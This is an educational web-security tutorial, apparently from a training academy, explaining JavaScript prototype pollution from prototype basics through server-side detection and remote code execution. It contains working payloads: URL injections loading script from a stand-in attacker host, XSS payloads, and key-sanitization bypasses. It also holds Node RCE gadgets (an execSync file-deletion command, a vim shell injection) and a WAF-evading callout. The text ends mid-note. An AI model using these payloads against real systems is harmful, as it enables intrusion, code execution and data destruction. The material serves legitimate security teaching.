## What is prototype pollution?

Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects.

Although prototype pollution is often unexploitable as a standalone vulnerability, it lets an attacker control properties of objects that would otherwise be inaccessible. If the application subsequently handles an attacker-controlled property in an unsafe way, this can potentially be chained with other vulnerabilities. In client-side JavaScript, this commonly leads to DOM XSS, while server-side prototype pollution can even result in remote code execution.

## What is an object in JavaScript?

A JavaScript object is essentially just a collection of `key:value` pairs known as "properties". For example, the following object could represent a user:

```javascript
const user =  {
    username: "wiener",
    userId: 01234,
    isAdmin: false
}
```
You can access the properties of an object by using either dot notation or bracket notation to refer to their respective keys:
```javascript
user.username     // "wiener"
user['userId']    // 01234
```
## What is an object in JavaScript? - Continued

As well as data, properties may also contain executable functions. In this case, the function is known as a "method".
```javascript
const user =  {
    username: "wiener",
    userId: 01234,
    exampleMethod: function(){
        // do something
    }
}
```
The example above is an "object literal", which means it was created using curly brace syntax to explicitly declare its properties and their initial values. However, it's important to understand that almost everything in JavaScript is an object under the hood. Throughout these materials, the term "object" refers to all entities, not just object literals.

## What is a prototype in JavaScript?

Every object in JavaScript is linked to another object of some kind, known as its prototype. By default, JavaScript automatically assigns new objects one of its built-in prototypes. For example, strings are automatically assigned the built-in `String.prototype`. You can see some more examples of these global prototypes below:

```javascript
let myObject = {};
Object.getPrototypeOf(myObject);    // Object.prototype

let myString = "";
Object.getPrototypeOf(myString);    // String.prototype

let myArray = [];
Object.getPrototypeOf(myArray);	    // Array.prototype

let myNumber = 1;
Object.getPrototypeOf(myNumber);    // Number.prototype
```
Objects automatically inherit all of the properties of their assigned prototype, unless they already have their own property with the same key. This enables developers to create new objects that can reuse the properties and methods of existing objects.

The built-in prototypes provide useful properties and methods for working with basic data types. For example, the `String.prototype` object has a `toLowerCase()` method. As a result, all strings automatically have a ready-to-use method for converting them to lowercase. This saves developers having to manually add this behavior to each new string that they create.

## How does object inheritance work in JavaScript?

Whenever you reference a property of an object, the JavaScript engine first tries to access this directly on the object itself. If the object doesn't have a matching property, the JavaScript engine looks for it on the object's prototype instead. Given the following objects, this enables you to reference `myObject.propertyA`, for example:

![Alt](https://portswigger.net/web-security/prototype-pollution/images/prototype-pollution-inheritance.svg)

## How does object inheritance work in JavaScript? - Continued

You can use your browser console to see this behavior in action. First, create a completely empty object:

`let myObject = {};`

Next, type `myObject` followed by a dot. Notice that the console prompts you to select from a list of properties and methods:

![img](https://portswigger.net/web-security/prototype-pollution/images/prototype-pollution-console-screenshot.png)

Even though there are no properties or methods defined for the object itself, it has inherited some from the built-in `Object.prototype`.

## The prototype chain

Note that an object's prototype is just another object, which should also have its own prototype, and so on. As virtually everything in JavaScript is an object under the hood, this chain ultimately leads back to the top-level `Object.prototype`, whose prototype is simply `null`.

Crucially, objects inherit properties not just from their immediate prototype, but from all objects above them in the prototype chain. In the example above, this means that the `username` object has access to the properties and methods of both `String.prototype` and `Object.prototype`.

## Accessing an object's prototype using __proto__

Every object has a special property that you can use to access its prototype. Although this doesn't have a formally standardized name, `__proto__` is the de facto standard used by most browsers. If you're familiar with object-oriented languages, this property serves as both a getter and setter for the object's prototype. This means you can use it to read the prototype and its properties, and even reassign them if necessary.

As with any property, you can access `__proto__` using either bracket or dot notation:

```javascript
username.__proto__
username['__proto__']

// You can even chain references to `__proto__` to work your way up the prototype chain:

username.__proto__                        // String.prototype
username.__proto__.__proto__              // Object.prototype
username.__proto__.__proto__.__proto__    // null
```

## Modifying prototypes

Although it's generally considered bad practice, it is possible to modify JavaScript's built-in prototypes just like any other object. This means developers can customize or override the behavior of built-in methods, and even add new methods to perform useful operations.

For example, modern JavaScript provides the `trim()` method for strings, which enables you to easily remove any leading or trailing whitespace. Before this built-in method was introduced, developers sometimes added their own custom implementation of this behavior to the `String.prototype` object by doing something like this:

```javascript
String.prototype.removeWhitespace = function(){
    // remove leading and trailing whitespace
}
```
Thanks to the prototypal inheritance, all strings would then have access to this method:
```javascript
let searchTerm = "  example ";
searchTerm.removeWhitespace();    // "example"
```

## How do prototype pollution vulnerabilities arise?

Prototype pollution vulnerabilities typically arise when a JavaScript function recursively merges an object containing user-controllable properties into an existing object, without first sanitizing the keys. This can allow an attacker to inject a property with a key like `__proto__`, along with arbitrary nested properties.

Due to the special meaning of `__proto__` in a JavaScript context, the merge operation may assign the nested properties to the object's prototype instead of the target object itself. As a result, the attacker can pollute the prototype with properties containing harmful values, which may subsequently be used by the application in a dangerous way.

It's possible to pollute any prototype object, but this most commonly occurs with the built-in global `Object.prototype`.

## How do prototype pollution vulnerabilities arise? - Continued

Successful exploitation of prototype pollution requires the following key components:

- A prototype pollution source - This is any input that enables you to poison prototype objects with arbitrary properties.
    
- A sink - In other words, a JavaScript function or DOM element that enables arbitrary code execution.
    
- An exploitable gadget - This is any property that is passed into a sink without proper filtering or sanitization.
## Prototype pollution sources

A prototype pollution source is any user-controllable input that enables you to add arbitrary properties to prototype objects. The most common sources are as follows:

- The URL via either the query or fragment string (hash)
    
- JSON-based input
    
- Web messages

## Prototype pollution via the URL

Consider the following URL, which contains an attacker-constructed query string:

`https://vulnerable-website.com/?__proto__[evilProperty]=payload`

When breaking the query string down into `key:value` pairs, a URL parser may interpret `__proto__` as an arbitrary string. But let's look at what happens if these keys and values are subsequently merged into an existing object as properties.

You might think that the `__proto__` property, along with its nested `evilProperty`, will just be added to the target object as follows:
```json
{
    existingProperty1: 'foo',
    existingProperty2: 'bar',
    __proto__: {
        evilProperty: 'payload'
    }
}
```
However, this isn't the case. At some point, the recursive merge operation may assign the value of `evilProperty` using a statement equivalent to the following:

`targetObject.__proto__.evilProperty = 'payload';`

During this assignment, the JavaScript engine treats `__proto__` as a getter for the prototype. As a result, `evilProperty` is assigned to the returned prototype object rather than the target object itself. Assuming that the target object uses the default `Object.prototype`, all objects in the JavaScript runtime will now inherit `evilProperty`, unless they already have a property of their own with a matching key.

In practice, injecting a property called `evilProperty` is unlikely to have any effect. However, an attacker can use the same technique to pollute the prototype with properties that are used by the application, or any imported libraries.

## Prototype pollution via JSON input

User-controllable objects are often derived from a JSON string using the `JSON.parse()` method. Interestingly, `JSON.parse()` also treats any key in the JSON object as an arbitrary string, including things like `__proto__`. This provides another potential vector for prototype pollution.

Let's say an attacker injects the following malicious JSON, for example, via a web message:

```json
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
```
If this is converted into a JavaScript object via the `JSON.parse()` method, the resulting object will in fact have a property with the key `__proto__`:
```javascript
const objectLiteral = {__proto__: {evilProperty: 'payload'}};
const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');

objectLiteral.hasOwnProperty('__proto__');     // false
objectFromJson.hasOwnProperty('__proto__');    // true
```
If the object created via `JSON.parse()` is subsequently merged into an existing object without proper key sanitization, this will also lead to prototype pollution during the assignment, as we saw in the previous URL-based example.

## Prototype pollution sinks

A prototype pollution sink is essentially just a JavaScript function or DOM element that you're able to access via prototype pollution, which enables you to execute arbitrary JavaScript or system commands. We've covered some client-side sinks extensively in our topic on DOM XSS.

As prototype pollution lets you control properties that would otherwise be inaccessible, this potentially enables you to reach a number of additional sinks within the target application. Developers who are unfamiliar with prototype pollution may wrongly assume that these properties are not user controllable, which means there may only be minimal filtering or sanitization in place.

## Prototype pollution gadgets

A gadget provides a means of turning the prototype pollution vulnerability into an actual exploit. This is any property that is:

- Used by the application in an unsafe way, such as passing it to a sink without proper filtering or sanitization.
    
- Attacker-controllable via prototype pollution. In other words, the object must be able to inherit a malicious version of the property added to the prototype by an attacker.
    

A property cannot be a gadget if it is defined directly on the object itself. In this case, the object's own version of the property takes precedence over any malicious version you're able to add to the prototype. Robust websites may also explicitly set the prototype of the object to `null`, which ensures that it doesn't inherit any properties at all.

## Example of a prototype pollution gadget

Many JavaScript libraries accept an object that developers can use to set different configuration options. The library code checks whether the developer has explicitly added certain properties to this object and, if so, adjusts the configuration accordingly. If a property that represents a particular option is not present, a predefined default option is often used instead. A simplified example may look something like this:

`let transport_url = config.transport_url || defaults.transport_url;`

Now imagine the library code uses this `transport_url` to add a script reference to the page:

```javascript
let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
```

If the website's developers haven't set a `transport_url` property on their `config` object, this is a potential gadget. In cases where an attacker is able to pollute the global `Object.prototype` with their own `transport_url` property, this will be inherited by the `config` object and, therefore, set as the `src` for this script to a domain of the attacker's choosing.

If the prototype can be polluted via a query parameter, for example, the attacker would simply have to induce a victim to visit a specially crafted URL to cause their browser to import a malicious JavaScript file from an attacker-controlled domain:

`https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net`

By providing a `data:` URL, an attacker could also directly embed an XSS payload within the query string as follows:

`https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//`

Note that the trailing `//` in this example is simply to comment out the hardcoded `/example.js` suffix.

## Finding client-side prototype pollution sources manually

Finding prototype pollution sources manually is largely a case of trial and error. In short, you need to try different ways of adding an arbitrary property to `Object.prototype` until you find a source that works.

When testing for client-side vulnerabilities, this involves the following high-level steps:

-  Try to inject an arbitrary property via the query string, URL fragment, and any JSON input. For example:
    
    `vulnerable-website.com/?__proto__[foo]=bar`
-  In your browser console, inspect `Object.prototype` to see if you have successfully polluted it with your arbitrary property:
```javascript
Object.prototype.foo
// "bar" indicates that you have successfully polluted the prototype
// undefined indicates that the attack was not successful
```

- If the property was not added to the prototype, try using different techniques, such as switching to dot notation rather than bracket notation, or vice versa:
    
    `vulnerable-website.com/?__proto__.foo=bar`
- Repeat this process for each potential source.
#### Tip

If neither of these techniques is successful, you may still be able to pollute the prototype via its constructor. We'll cover how to do this in more detail later.

## Finding client-side prototype pollution sources using DOM Invader

As you can see, finding prototype pollution sources manually can be a fairly tedious process. Instead, we recommend using DOM Invader, which comes preinstalled with Burp's built-in browser. DOM Invader is able to automatically test for prototype pollution sources as you browse, which can save you a considerable amount of time and effort.

## Finding client-side prototype pollution gadgets manually

Once you've identified a source that lets you add arbitrary properties to the global `Object.prototype`, the next step is to find a suitable gadget that you can use to craft an exploit. In practice, we recommend using DOM Invader to do this, but it's useful to look at the manual process as it may help solidify your understanding of the vulnerability.

1. Look through the source code and identify any properties that are used by the application or any libraries that it imports.
    
2. In Burp, enable response interception (**Proxy > Options > Intercept server responses**) and intercept the response containing the JavaScript that you want to test.
    
3. Add a `debugger` statement at the start of the script, then forward any remaining requests and responses.
    
4. In Burp's browser, go to the page on which the target script is loaded. The `debugger` statement pauses execution of the script.
    
5. While the script is still paused, switch to the console and enter the following command, replacing `YOUR-PROPERTY` with one of the properties that you think is a potential gadget:

```javascript
Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
    get() {
        console.trace();
        return 'polluted';
    }
})
```
The property is added to the global `Object.prototype`, and the browser will log a stack trace to the console whenever it is accessed.

6. Press the button to continue execution of the script and monitor the console. If a stack trace appears, this confirms that the property was accessed somewhere within the application.
	
1. Expand the stack trace and use the provided link to jump to the line of code where the property is being read.
    
8. Using the browser's debugger controls, step through each phase of execution to see if the property is passed to a sink, such as `innerHTML` or `eval()`.
    
9. Repeat this process for any properties that you think are potential gadgets.

## Finding client-side prototype pollution gadgets using DOM Invader

As you can see from the previous steps, manually identifying prototype pollution gadgets in the wild can be a laborious task. Given that websites often rely on a number of third-party libraries, this may involve reading through thousands of lines of minified or obfuscated code, which makes things even trickier. DOM Invader can automatically scan for gadgets on your behalf and can even generate a DOM XSS proof-of-concept in some cases. This means you can find exploits on real-world sites in a matter of seconds rather than hours.

## Prototype pollution via the constructor

So far, we've looked exclusively at how you can get a reference to prototype objects via the special `__proto__` accessor property. As this is the classic technique for prototype pollution, a common defense is to strip any properties with the key `__proto__` from user-controlled objects before merging them. This approach is flawed as there are alternative ways to reference `Object.prototype` without relying on the `__proto__` string at all.

Unless its prototype is set to `null`, every JavaScript object has a `constructor` property, which contains a reference to the constructor function that was used to create it. For example, you can create a new object either using literal syntax or by explicitly invoking the `Object()` constructor as follows:

```javascript
let myObjectLiteral = {};
let myObject = new Object();
```

You can then reference the `Object()` constructor via the built-in `constructor` property:
```javascript
myObjectLiteral.constructor            // function Object(){...}
myObject.constructor                   // function Object(){...}
```
Remember that functions are also just objects under the hood. Each constructor function has a `prototype` property, which points to the prototype that will be assigned to any objects that are created by this constructor. As a result, you can also access any object's prototype as follows:
```javascript
myObject.constructor.prototype        // Object.prototype
myString.constructor.prototype        // String.prototype
myArray.constructor.prototype         // Array.prototype
```
As `myObject.constructor.prototype` is equivalent to `myObject.__proto__`, this provides an alternative vector for prototype pollution.

## Bypassing flawed key sanitization

An obvious way in which websites attempt to prevent prototype pollution is by sanitizing property keys before merging them into an existing object. However, a common mistake is failing to recursively sanitize the input string. For example, consider the following URL:

`vulnerable-website.com/?__pro__proto__to__.gadget=payload`

If the sanitization process just strips the string `__proto__` without repeating this process more than once, this would result in the following URL, which is a potentially valid prototype pollution source:

`vulnerable-website.com/?__proto__.gadget=payload`

## Prototype pollution in external libraries

As we've touched on already, prototype pollution gadgets may occur in third-party libraries that are imported by the application. In this case, we strongly recommend using DOM Invader's prototype pollution features to identify sources and gadgets. Not only is this much quicker, it also ensures you won't miss vulnerabilities that would otherwise be extremely tricky to notice.


## Prototype pollution via browser APIs

You may be surprised to learn that there are a number of widespread prototype pollution gadgets in the JavaScript APIs commonly provided in browsers. In this section, we'll show you how to exploit these for DOM XSS, potentially bypassing flawed prototype pollution defenses implemented by developers.

## Prototype pollution via fetch()

The `Fetch` API provides a simple way for developers to trigger HTTP requests using JavaScript. The `fetch()` method accepts two arguments:

- The URL to which you want to send the request.
    
- An options object that lets you to control parts of the request, such as the method, headers, body parameters, and so on.
    

The following is an example of how you might send a `POST` request using `fetch()`:

```javascript
fetch('https://normal-website.com/my-account/change-email', {
    method: 'POST',
    body: 'user=carlos&email=carlos%40ginandjuice.shop'
})
```
As you can see, we've explicitly defined `method` and `body` properties, but there are a number of other possible properties that we've left undefined. In this case, if an attacker can find a suitable source, they could potentially pollute `Object.prototype` with their own `headers` property. This may then be inherited by the options object passed into `fetch()` and subsequently used to generate the request.

## Prototype pollution via fetch() - Continued

This can lead to a number of issues. For example, the following code is potentially vulnerable to DOM XSS via prototype pollution:

```javascript
fetch('/my-products.json',{method:"GET"})
    .then((response) => response.json())
    .then((data) => {
        let username = data['x-username'];
        let message = document.querySelector('.message');
        if(username) {
            message.innerHTML = `My products. Logged in as <b>${username}</b>`;
        }
        let productList = document.querySelector('ul.products');
        for(let product of data) {
            let product = document.createElement('li');
            product.append(product.name);
            productList.append(product);
        }
    })
    .catch(console.error);
```

To exploit this, an attacker could pollute `Object.prototype` with a `headers` property containing a malicious `x-username` header as follows:

`?__proto__[headers][x-username]=<img/src/onerror=alert(1)>`

Let's assume that server-side, this header is used to set the value of the `x-username` property in the returned JSON file. In the vulnerable client-side code above, this is then assigned to the `username` variable, which is later passed into the `innerHTML` sink, resulting in DOM XSS.

#### Note

You can use this technique to control any undefined properties of the options object passed to `fetch()`. This may enable you to add a malicious body to the request, for example.


## Prototype pollution via Object.defineProperty()

Developers with some knowledge of prototype pollution may attempt to block potential gadgets by using the `Object.defineProperty()` method. This enables you to set a non-configurable, non-writable property directly on the affected object as follows:

```javascript
Object.defineProperty(vulnerableObject, 'gadgetProperty', {
    configurable: false,
    writable: false
})
```

This may initially seem like a reasonable mitigation attempt as this prevents the vulnerable object from inheriting a malicious version of the gadget property via the prototype chain. However, this approach is inherently flawed.

Just like the `fetch()` method we looked at earlier, `Object.defineProperty()` accepts an options object, known as a "descriptor". You can see this in the example above. Among other things, developers can use this descriptor object to set an initial value for the property that's being defined. However, if the only reason that they're defining this property is to protect against prototype pollution, they might not bother setting a value at all.

In this case, an attacker may be able to bypass this defense by polluting `Object.prototype` with a malicious `value` property. If this is inherited by the descriptor object passed to `Object.defineProperty()`, the attacker-controlled value may be assigned to the gadget property after all.

## Server-side prototype pollution

JavaScript was originally a client-side language designed to run in browsers. However, due to the emergence of server-side runtimes, such as the hugely popular Node.js, JavaScript is now widely used to build servers, APIs, and other back-end applications. Logically, this means that it's also possible for prototype pollution vulnerabilities to arise in server-side contexts.

Although the fundamental concepts remain largely the same, the process of identifying server-side prototype pollution vulnerabilities, and developing them into working exploits, presents some additional challenges.

In this section, you'll learn a number of techniques for black-box detection of server-side prototype pollution. We'll cover how to do this efficiently and non-destructively, then use interactive, deliberately vulnerable labs to demonstrate how you can leverage prototype pollution for remote code execution.

## Why is server-side prototype pollution more difficult to detect?

For a number of reasons, server-side prototype pollution is generally more difficult to detect than its client-side variant:

- **No source code access** - Unlike with client-side vulnerabilities, you typically won't have access to the vulnerable JavaScript. This means there's no easy way to get an overview of which sinks are present or spot potential gadget properties.
- **Lack of developer tools** - As the JavaScript is running on a remote system, you don't have the ability to inspect objects at runtime like you would when using your browser's DevTools to inspect the DOM. This means it can be hard to tell when you've successfully polluted the prototype unless you've caused a noticeable change in the website's behavior. This limitation obviously doesn't apply to white-box testing.
- **The DoS problem** - Successfully polluting objects in a server-side environment using real properties often breaks application functionality or brings down the server completely. As it's easy to inadvertently cause a denial-of-service (DoS), testing in production can be dangerous. Even if you do identify a vulnerability, developing this into an exploit is also tricky when you've essentially broken the site in the process.
- **Pollution persistence** - When testing in a browser, you can reverse all of your changes and get a clean environment again by simply refreshing the page. Once you pollute a server-side prototype, this change persists for the entire lifetime of the Node process and you don't have any way of resetting it.

In the following sections, we'll cover a number of non-destructive techniques that enable you to safely test for server-side prototype pollution despite these limitations.

## Detecting server-side prototype pollution via polluted property reflection

An easy trap for developers to fall into is forgetting or overlooking the fact that a JavaScript `for...in` loop iterates over all of an object's enumerable properties, including ones that it has inherited via the prototype chain.

#### Note

This doesn't include built-in properties set by JavaScript's native constructors as these are non-enumerable by default.

## Detecting server-side prototype pollution via polluted property reflection - Continued

You can test this out for yourself as follows:

```javascript
const myObject = { a: 1, b: 2 };

// pollute the prototype with an arbitrary property
Object.prototype.foo = 'bar';

// confirm myObject doesn't have its own foo property
myObject.hasOwnProperty('foo'); // false

// list names of properties of myObject
for(const propertyKey in myObject){
    console.log(propertyKey);
}

// Output: a, b, foo
```
This also applies to arrays, where a `for...in` loop first iterates over each index, which is essentially just a numeric property key under the hood, before moving on to any inherited properties as well.

```javascript
const myArray = ['a','b'];
Object.prototype.foo = 'bar';

for(const arrayKey in myArray){
    console.log(arrayKey);
}

// Output: 0, 1, foo
```
In either case, if the application later includes the returned properties in a response, this can provide a simple way to probe for server-side prototype pollution.

`POST` or `PUT` requests that submit JSON data to an application or API are prime candidates for this kind of behavior as it's common for servers to respond with a JSON representation of the new or updated object. In this case, you could attempt to pollute the global `Object.prototype` with an arbitrary property as follows:

```http
POST /user/update HTTP/1.1
Host: vulnerable-website.com
...
{
    "user":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "__proto__":{
        "foo":"bar"
    }
}
```

If the website is vulnerable, your injected property would then appear in the updated object in the response:

```http
HTTP/1.1 200 OK
...
{
    "username":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "foo":"bar"
}
```


Detecting server-side prototype pollution via polluted property reflection - Continued

In rare cases, the website may even use these properties to dynamically generate HTML, resulting in the injected property being rendered in your browser.

Once you identify that server-side prototype pollution is possible, you can then look for potential gadgets to use for an exploit. Any features that involve updating user data are worth investigating as these often involve merging the incoming data into an existing object that represents the user within the application. If you can add arbitrary properties to your own user, this can potentially lead to a number of vulnerabilities, including privilege escalation.


## Detecting server-side prototype pollution without polluted property reflection

Most of the time, even when you successfully pollute a server-side prototype object, you won't see the affected property reflected in a response. Given that you can't just inspect the object in a console either, this presents a challenge when trying to tell whether your injection worked.

One approach is to try injecting properties that match potential configuration options for the server. You can then compare the server's behavior before and after the injection to see whether this configuration change appears to have taken effect. If so, this is a strong indication that you've successfully found a server-side prototype pollution vulnerability.

In this section, we'll look at the following techniques:

- Status code override
- JSON spaces override
- Charset override

All of these injections are non-destructive, but still produce a consistent and distinctive change in server behavior when successful. You can use any of the techniques covered in this section to solve the accompanying lab.

## Status code override

Server-side JavaScript frameworks like Express allow developers to set custom HTTP response statuses. In the case of errors, a JavaScript server may issue a generic HTTP response, but include an error object in JSON format in the body. This is one way of providing additional details about why an error occurred, which may not be obvious from the default HTTP status.

Although it's somewhat misleading, it's even fairly common to receive a `200 OK` response, only for the response body to contain an error object with a different status.

```http
HTTP/1.1 200 OK
...
{
    "error": {
        "success": false,
        "status": 401,
        "message": "You do not have permission to access this resource."
    }
}
```

## Status code override - Continued

Node's `http-errors` module contains the following function for generating this kind of error response:
```javascript
function createError () {
    //...
    if (type === 'object' && arg instanceof Error) {
        err = arg
        status = err.status || err.statusCode || status
    } else if (type === 'number' && i === 0) {
    //...
    if (typeof status !== 'number' ||
    (!statuses.message[status] && (status < 400 || status >= 600))) {
        status = 500
    }
    //...
```
 The first highlighted line attempts to assign the status variable by reading the status or statusCode property from the object passed into the function. If the website's developers haven't explicitly set a status property for the error, you can potentially use this to probe for prototype pollution as follows:

    Find a way to trigger an error response and take note of the default status code.
    Try polluting the prototype with your own status property. Be sure to use an obscure status code that is unlikely to be issued for any other reason.
    Trigger the error response again and check whether you've successfully overridden the status code.

Note

You must choose a status code in the 400-599 range. Otherwise, Node defaults to a 500 status regardless, as you can see from the second highlighted line, so you won't know whether you've polluted the prototype or not.


## JSON spaces override

The Express framework provides a `json spaces` option, which enables you to configure the number of spaces used to indent any JSON data in the response. In many cases, developers leave this property undefined as they're happy with the default value, making it susceptible to pollution via the prototype chain.

If you've got access to any kind of JSON response, you can try polluting the prototype with your own `json spaces` property, then reissue the relevant request to see if the indentation in the JSON increases accordingly. You can perform the same steps to remove the indentation in order to confirm the vulnerability.

## JSON spaces override - Continued

This is an especially useful technique because it doesn't rely on a specific property being reflected. It's also extremely safe as you're effectively able to turn the pollution on and off simply by resetting the property to the same value as the default.

Although the prototype pollution has been fixed in Express 4.17.4, websites that haven't upgraded may still be vulnerable.

#### Note

When attempting this technique in Burp, remember to switch to the message editor's **Raw** tab. Otherwise, you won't be able to see the indentation change as the default prettified view normalizes this.

## Charset override

Express servers often implement so-called "middleware" modules that enable preprocessing of requests before they're passed to the appropriate handler function. For example, the `body-parser` module is commonly used to parse the body of incoming requests in order to generate a `req.body` object. This contains another gadget that you can use to probe for server-side prototype pollution.

Notice that the following code passes an options object into the `read()` function, which is used to read in the request body for parsing. One of these options, `encoding`, determines which character encoding to use. This is either derived from the request itself via the `getCharset(req)` function call, or it defaults to UTF-8.

```javascript
var charset = getCharset(req) or 'utf-8'

function getCharset (req) {
    try {
        return (contentType.parse(req).parameters.charset || '').toLowerCase()
    } catch (e) {
        return undefined
    }
}

read(req, res, next, parse, debug, {
    encoding: charset,
    inflate: inflate,
    limit: limit,
    verify: verify
})
```

If you look closely at the `getCharset()` function, it looks like the developers have anticipated that the `Content-Type` header may not contain an explicit `charset` attribute, so they've implemented some logic that reverts to an empty string in this case. Crucially, this means it may be controllable via prototype pollution.

## Charset override - Continued

If you can find an object whose properties are visible in a response, you can use this to probe for sources. In the following example, we'll use UTF-7 encoding and a JSON source.

- Add an arbitrary UTF-7 encoded string to a property that's reflected in a response. For example, `foo` in UTF-7 is `+AGYAbwBv-`.
```json
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"+AGYAbwBv-"
}
```
- Send the request. Servers won't use UTF-7 encoding by default, so this string should appear in the response in its encoded form.
- Try to pollute the prototype with a `content-type` property that explicitly specifies the UTF-7 character set:
```json
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"default",
    "__proto__":{
        "content-type": "application/json; charset=utf-7"
    }
}
```
- Repeat the first request. If you successfully polluted the prototype, the UTF-7 string should now be decoded in the response:
```json
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"foo"
}
```

## Charset override - Continued

Due to a bug in Node's `_http_incoming` module, this works even when the request's actual `Content-Type` header includes its own `charset` attribute. To avoid overwriting properties when a request contains duplicate headers, the `_addHeaderLine()` function checks that no property already exists with the same key before transferring properties to an `IncomingMessage` object
```javascript
IncomingMessage.prototype._addHeaderLine = _addHeaderLine;
function _addHeaderLine(field, value, dest) {
    // ...
    } else if (dest[field] === undefined) {
        // Drop duplicates
        dest[field] = value;
    }
}
```
If it does, the header being processed is effectively dropped. Due to the way this is implemented, this check (presumably unintentionally) includes properties inherited via the prototype chain. This means that if we pollute the prototype with our own `content-type` property, the property representing the real `Content-Type` header from the request is dropped at this point, along with the intended value derived from the header.

## Scanning for server-side prototype pollution sources

Although it's useful to try manually probing for sources in order to solidify your understanding of the vulnerability, this can be repetitive and time-consuming in practice. For this reason, we've created the Server-Side Prototype Pollution Scanner extension for Burp Suite, which enables you to automate this process. The basic workflow is as follows:

1. Install the **Server-Side Prototype Pollution Scanner** extension from the BApp Store and make sure that it is enabled. For details on how to do this, see Installing extensions
2. Explore the target website using Burp's browser to map as much of the content as possible and accumulate traffic in the proxy history.
3. In Burp, go to the **Proxy > HTTP history** tab.
4. Filter the list to show only in-scope items.
5. Select all items in the list.
6. Right-click your selection and go to **Extensions > Server-Side Prototype Pollution Scanner > Server-Side Prototype Pollution**, then select one of the scanning techniques from the list.
7. When prompted, modify the attack configuration if required, then click **OK** to launch the scan.
## Scanning for server-side prototype pollution sources - Continued

In Burp Suite Professional, the extension reports any prototype pollution sources it finds via the **Issue activity** panel on the **Dashboard** and **Target** tabs. If you're using Burp Suite Community Edition, you need to go to the **Extensions > Installed** tab, select the extension, then monitor its **Output** tab for any reported issues.

#### Note

If you're unsure which scanning technique to use, you can also select **Full scan** to run a scan using all of the available techniques. However, this will involve sending significantly more requests.

## Bypassing input filters for server-side prototype pollution

Websites often attempt to prevent or patch prototype pollution vulnerabilities by filtering suspicious keys like `__proto__`. This key sanitization approach is not a robust long-term solution as there are a number of ways it can potentially be bypassed. For example, an attacker can:

- Obfuscate the prohibited keywords so they're missed during the sanitization. For more information, see Bypassing flawed key sanitization.
- Access the prototype via the constructor property instead of `__proto__`. For more information, see Prototype pollution via the constructor

Node applications can also delete or disable `__proto__` altogether using the command-line flags `--disable-proto=delete` or `--disable-proto=throw` respectively. However, this can also be bypassed by using the constructor technique.

## Remote code execution via server-side prototype pollution

While client-side prototype pollution typically exposes the vulnerable website to DOM XSS, server-side prototype pollution can potentially result in remote code execution (RCE). In this section, you'll learn how to identify cases where this may be possible and how to exploit some potential vectors in Node applications.

## Identifying a vulnerable request

There are a number of potential command execution sinks in Node, many of which occur in the `child_process` module. These are often invoked by a request that occurs asynchronously to the request with which you're able to pollute the prototype in the first place. As a result, the best way to identify these requests is by polluting the prototype with a payload that triggers an interaction with Burp Collaborator when called.

The `NODE_OPTIONS` environment variable enables you to define a string of command-line arguments that should be used by default whenever you start a new Node process. As this is also a property on the `env` object, you can potentially control this via prototype pollution if it is undefined.

## Identifying a vulnerable request - Continued

Some of Node's functions for creating new child processes accept an optional `shell` property, which enables developers to set a specific shell, such as bash, in which to run commands. By combining this with a malicious `NODE_OPTIONS` property, you can pollute the prototype in a way that causes an interaction with Burp Collaborator whenever a new Node process is created:
```javascript
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
}
```
This way, you can easily identify when a request creates a new child process with command-line arguments that are controllable via prototype pollution.

#### Tip

The escaped double-quotes in the hostname aren't strictly necessary. However, this can help to reduce false positives by obfuscating the hostname to evade WAFs and other systems that scrape for hostnames.

## Remote code execution via child_process.fork()

Methods such as `child_process.spawn()` and `child_process.fork()` enable developers to create new Node subprocesses. The `fork()` method accepts an options object in which one of the potential options is the `execArgv` property. This is an array of strings containing command-line arguments that should be used when spawning the child process. If it's left undefined by the developers, this potentially also means it can be controlled via prototype pollution.

As this gadget lets you directly control the command-line arguments, this gives you access to some attack vectors that wouldn't be possible using `NODE_OPTIONS`. Of particular interest is the `--eval` argument, which enables you to pass in arbitrary JavaScript that will be executed by the child process. This can be quite powerful, even enabling you to load additional modules into the environment:

```javascript
"execArgv": [
    "--eval=require('<module>')"
]
// Or
"execArgv":[
	"--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
]
```

In addition to `fork()`, the `child_process` module contains the `execSync()` method, which executes an arbitrary string as a system command. By chaining these JavaScript and command injection sinks, you can potentially escalate prototype pollution to gain full RCE capability on the server.

## Remote code execution via child_process.execSync()

In the previous example, we injected the `child_process.execSync()` sink ourselves via the `--eval` command line argument. In some cases, the application may invoke this method of its own accord in order to execute system commands.

Just like `fork()`, the `execSync()` method also accepts options object, which may be pollutable via the prototype chain. Although this doesn't accept an `execArgv` property, you can still inject system commands into a running child process by simultaneously polluting both the `shell` and `input` properties:

- The `input` option is just a string that is passed to the child process's `stdin` stream and executed as a system command by `execSync()`. As there are other options for providing the command, such as simply passing it as an argument to the function, the `input` property itself may be left undefined.
- The `shell` option lets developers declare a specific shell in which they want the command to run. By default, `execSync()` uses the system's default shell to run commands, so this may also be left undefined.
## Remote code execution via child_process.execSync() - Continued

By polluting both of these properties, you may be able to override the command that the application's developers intended to execute and instead run a malicious command in a shell of your choosing. Note that there are a few caveats to this:

- The `shell` option only accepts the name of the shell's executable and does not allow you to set any additional command-line arguments.
- The shell is always executed with the `-c` argument, which most shells use to let you pass in a command as a string. However, setting the `-c` flag in Node instead runs a syntax check on the provided script, which also prevents it from executing. As a result, although there are workarounds for this, it's generally tricky to use Node itself as a shell for your attack.
- As the `input` property containing your payload is passed via `stdin`, the shell you choose must accept commands from `stdin`.
## Remote code execution via child_process.execSync() - Continued

Although they aren't really intended to be shells, the text editors Vim and ex reliably fulfill all of these criteria. If either of these happen to be installed on the server, this creates a potential vector for RCE:
```json
"shell":"vim",
"input":":! <command>\n"
```
#### Note

